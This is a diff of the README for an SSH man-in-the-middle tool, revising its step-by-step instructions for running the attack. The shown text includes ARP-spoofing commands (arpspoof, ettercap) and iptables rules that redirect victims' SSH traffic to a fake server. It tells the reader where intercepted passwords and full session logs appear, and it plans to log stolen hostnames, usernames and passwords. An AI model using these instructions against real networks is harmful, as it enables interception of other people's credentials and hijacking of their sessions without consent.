@@ -23,6 +23,7 @@ Of course, the victim's SSH client will complain that the server's key has chang
 The following list tracks areas to improve:
 
 * Support SFTP MITM'ing.
+* Print hostname, username, and password at the top of session logs.
 * Add port forwarding support.
 * Regex substitute the output of *ssh-keygen* when a user tries to check the host key hash. >:]
 * Create wrapper script that detects when user is trying to use key authentication only, and de-spoof them automatically.
@@ -58,23 +59,9 @@ The above output shows that two devices on the LAN have created SSH connections 
 
 ## Running The Attack
 
-0.) Run the *install.sh* script, as mentioned above (this only needs to be done once).
+1.) Once you've completed the initial setup and found a list of potential victims (see above), execute *run.sh* as root.  This will execute *sshd_mitm*, enable IP forwarding, and set up SSH packet interception through *iptables*.
 
-1.) Run *sshd_mitm*:
-
-    sudo su - ssh-mitm -c "./run.sh"
-
-2.) Enable IP forwarding:
-
-    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
-    sudo iptables -P FORWARD ACCEPT
-
-3.) Allow connections to *sshd_mitm* and re-route forwarded SSH connections:
-
-    sudo iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
-    sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
-
-4.) ARP spoof a target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):
+2.) ARP spoof the target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):
 
     arpspoof -r -t 192.168.x.1 192.168.x.5
 
@@ -82,11 +69,11 @@ Alternatively, you can use the *ettercap* tool:
 
     ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//
 
-5.) Monitor *auth.log*.  Intercepted passwords will appear here:
+3.) Monitor *auth.log*.  Intercepted passwords will appear here:
 
     sudo tail -f /var/log/auth.log
 
-6.) Once a session is established, a full log of all input & output can be found in */home/ssh-mitm/session_\*.txt*.
+4.) Once a session is established, a full log of all input & output can be found in */home/ssh-mitm/session_\*.txt*.
 
 
 ## Sample Results
